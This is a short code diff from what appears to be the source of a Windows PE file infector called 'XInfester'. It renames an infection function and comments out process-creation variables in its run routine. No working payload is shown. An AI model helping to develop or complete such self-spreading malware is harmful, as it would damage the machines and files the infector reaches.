@@ -62,7 +62,7 @@ void ResourcesFixer(WORD *id,wchar_t *Name,DWORD length,DWORD *offsetToDataEnter
 
 
 
-BOOL XInfester_InfestFile( const char *pDestFileName )
+BOOL XInfester_InfectFile( const char *pDestFileName )
 {
 	PEStructure __Dest,__Final;
 	FILE *Destfp=NULL;
@@ -156,8 +156,8 @@ _ERR:
 
 void XInfester_Run()
 {
-	STARTUPINFO si;
-	PROCESS_INFORMATION pi;
+// 	STARTUPINFO si;
+// 	PROCESS_INFORMATION pi;
 
 	PEStructure _SelfPE;
 	if (!_SelfPE.Load_PE_File(GetLocalAppFilename()))
